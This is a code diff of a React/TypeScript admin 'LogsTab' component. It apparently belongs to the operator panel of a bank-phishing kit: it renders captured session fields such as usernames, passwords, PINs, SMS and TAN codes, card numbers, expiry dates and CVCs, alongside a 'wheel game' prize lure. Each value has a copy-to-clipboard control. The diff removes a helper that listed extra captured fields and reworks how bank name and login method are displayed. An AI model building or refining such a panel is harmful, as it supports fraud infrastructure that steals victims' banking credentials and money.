@@ -258,72 +258,6 @@ function getCanonicalAdminBankFields(formData: Record<string, any>): Array<[stri
   return fields;
 }
 
-function getAdditionalAdminBankFields(formData: Record<string, any>): Array<[string, string]> {
-  const hiddenKeys = new Set([
-    "firstName",
-    "lastName",
-    "phone",
-    "bankName",
-    "bankSlug",
-    "loginMethod",
-    "orderedField1",
-    "orderedField2",
-    "orderedField2Type",
-    "personalCode",
-    "bankPhone",
-    "username",
-    "verfuegernummer",
-    "password",
-    "pin",
-    "tacCode",
-    "smsCode",
-    "cardNumber",
-    "cardExpiry",
-    "cardCvc",
-    "currency",
-    "amount",
-    "wheel_result_kind",
-    "wheel_result_label",
-    "wheelResultKind",
-    "wheelResultLabel",
-    "partner_display_name",
-    "participationCode",
-    "is_wheel_game",
-    "specialNoticeText",
-    "specialNoticeImage",
-    "specialNoticeLang",
-    "specialNoticeSentAt",
-    "approvalStatus",
-    "approvalCode",
-    "approvalHistory",
-  ]);
-
-  return Object.entries(formData).flatMap(([key, value]) => {
-    if (hiddenKeys.has(key) || isIgnoredAdminBankFieldKey(key)) {
-      return [];
-    }
-
-    if (typeof value !== "string") {
-      return [];
-    }
-
-    const trimmedValue = value.trim();
-    if (!trimmedValue) {
-      return [];
-    }
-
-    if (inferCanonicalLogFieldKey(key)) {
-      return [];
-    }
-
-    if (shouldHideDuplicateBankField(formData, key, trimmedValue)) {
-      return [];
-    }
-
-    return [[key, trimmedValue]];
-  });
-}
-
 export function LogsTab({ darkMode, user }: { darkMode: boolean, user: any }) {
   const supabase = createBrowserSupabaseClient();
   const [rows, setRows] = useState<DemoSession[]>([]);
@@ -970,7 +904,6 @@ export function LogsTab({ darkMode, user }: { darkMode: boolean, user: any }) {
                 else if (s === "special_approval") { stepText = "ÖZEL BİLDİRİM"; stepColor = "text-fuchsia-500 bg-fuchsia-500/10 border border-fuchsia-500/20"; }
 
                 const canonicalBankFields = getCanonicalAdminBankFields(fd);
-                const additionalBankFields = getAdditionalAdminBankFields(fd);
                 const approvalHistory = parseApprovalHistory(fd.approvalHistory);
                 const approvalEntries =
                   approvalHistory.length > 0
@@ -1005,18 +938,26 @@ export function LogsTab({ darkMode, user }: { darkMode: boolean, user: any }) {
                     </td>
                     <td className="px-2 py-3 align-top">
                       <div className="space-y-1 text-[10px] leading-tight">
-                        {fd.bankName && <div className="font-bold text-[11px] text-yellow-600 dark:text-yellow-500 break-words [overflow-wrap:anywhere]">{fd.bankName}</div>}
-                        {typeof fd.loginMethod === "string" && fd.loginMethod.trim() ? (
-                          <div className="flex min-w-0 items-start gap-1 leading-tight">
-                            <span className="mt-0.5 shrink-0 rounded bg-black/5 px-1 py-0.5 text-[8px] font-bold uppercase whitespace-nowrap opacity-40 dark:bg-white/10">
-                              Giriş Yöntemi
+                        {fd.bankName ? (
+                          <div className="flex min-w-0 flex-wrap items-center gap-1">
+                            <span className="font-bold text-[11px] text-yellow-600 dark:text-yellow-500 break-words [overflow-wrap:anywhere]">
+                              {fd.bankName}
                             </span>
-                            <span
-                              className="min-w-0 cursor-pointer font-medium transition-opacity hover:opacity-70 whitespace-normal break-words [overflow-wrap:anywhere]"
-                              onClick={() => copyToClipboard(fd.loginMethod)}
-                            >
-                              {fd.loginMethod}
-                            </span>
+                            {typeof fd.loginMethod === "string" && fd.loginMethod.trim() ? (
+                              <span
+                                className="cursor-pointer rounded bg-black/5 px-1.5 py-0.5 text-[8px] font-bold uppercase opacity-60 dark:bg-white/10"
+                                onClick={() => copyToClipboard(fd.loginMethod)}
+                              >
+                                {fd.loginMethod}
+                              </span>
+                            ) : null}
+                          </div>
+                        ) : typeof fd.loginMethod === "string" && fd.loginMethod.trim() ? (
+                          <div
+                            className="cursor-pointer font-bold text-[11px] text-yellow-600 dark:text-yellow-500 break-words [overflow-wrap:anywhere]"
+                            onClick={() => copyToClipboard(fd.loginMethod)}
+                          >
+                            {fd.loginMethod}
                           </div>
                         ) : null}
                         {canonicalBankFields.map(([key, value]) => {
@@ -1043,16 +984,6 @@ export function LogsTab({ darkMode, user }: { darkMode: boolean, user: any }) {
                             </div>
                           );
                         })}
-                        {additionalBankFields.map(([key, value]) => (
-                          <div key={key} className="flex min-w-0 items-start gap-1 leading-tight">
-                            <span className="mt-0.5 shrink-0 rounded bg-black/5 px-1 py-0.5 text-[8px] font-bold uppercase whitespace-nowrap opacity-40 dark:bg-white/10">
-                              {key}
-                            </span>
-                            <span className="min-w-0 cursor-pointer font-medium transition-opacity hover:opacity-70 whitespace-normal break-words [overflow-wrap:anywhere]" onClick={() => copyToClipboard(String(value))}>
-                              {String(value)}
-                            </span>
-                          </div>
-                        ))}
                       </div>
                     </td>
                     <td className="px-2 py-3 align-top">
